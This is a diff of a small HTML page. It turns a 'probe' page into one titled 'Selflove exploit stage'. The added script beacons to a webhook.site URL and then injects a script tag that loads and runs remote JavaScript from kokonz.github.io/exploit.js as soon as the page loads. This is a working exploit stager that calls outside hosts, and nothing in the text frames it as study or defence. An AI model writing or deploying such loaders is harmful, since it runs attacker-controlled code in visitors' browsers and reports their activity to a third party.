@@ -1,9 +1,17 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>probe</h1>
-    <script>
-      fetch("https://webhook.site/b9156efa-c3b8-4b18-87d8-b0ce646a4efb?vercel_loaded")
-    </script>
-  </body>
+<body>
+<h1>Selflove exploit stage</h1>
+
+<script>
+const hook = "https://webhook.site/b9156efa-c3b8-4b18-87d8-b0ce646a4efb";
+
+fetch(hook + "?stage=loader").catch(()=>{});
+
+let s = document.createElement("script");
+s.src = "https://kokonz.github.io/exploit.js";
+document.body.appendChild(s);
+</script>
+
+</body>
 </html>
